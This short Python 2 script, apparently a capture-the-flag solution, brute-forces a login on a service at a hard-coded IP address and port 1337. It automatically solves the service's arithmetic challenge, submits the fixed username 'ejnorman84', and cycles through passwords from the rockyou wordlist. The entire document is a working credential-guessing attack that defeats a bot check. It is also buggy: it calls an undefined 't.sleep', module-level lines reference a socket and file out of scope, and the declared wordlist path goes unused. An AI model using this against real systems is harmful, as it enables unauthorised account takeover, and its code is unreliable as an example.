import socket
import time

host = "157.230.179.99" # IP address here
port = 1337 # Port here
wordlist = "/usr/share/wordlists/rockyou.txt.gz" # Point to wordlist file, loop through the file

def brute_force():
   a = []
   b = []
   ans = ""
   data = "Fail\n"
   f = open("rockyou.txt", "r")

   while data == "Fail\n":
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host,port))

        time.sleep(.1)
        data = s.recv(2048)
        print(data)

        a = (data.split("\n"))

        if len(a) == 4 or len(a) == 5:
            if len(a) == 4:
                b = (a[2]).split(" ")
            elif len(a) == 5:
                b = (a[3]).split(" ")

            if b[1] == "*":
                ans = int(b[0]) * int(b[2])
                s.send(str(ans) + '\n')
            elif b[1] == "+":
                ans = int(b[0]) + int(b[2])
                s.send(str(ans) + '\n')
            elif b[1] == "-":
                ans = int(b[0]) - int(b[2])
                s.send(str(ans) + '\n')
            else:
                ans = int(b[0]) / int(b[2])
                s.send(str(ans) + '\n')

            data = s.recv(2048)
            print(data)

            username = "ejnorman84"
            s.send(username + '\n')
            print(username)

            time.sleep(.5)
            data = s.recv(2048)
            print(data)

            time.sleep(.5)
            password = f.readline()
            print(password)
            s.send(password + '\n')

            data = s.recv(2048)
            print(data)

            t.sleep(.5)
        else: 
            data = "Fail\n"

data = s.recv(5000)
print(data)

f.close()
s.close()
        




if __name__ == '__main__':
    brute_force()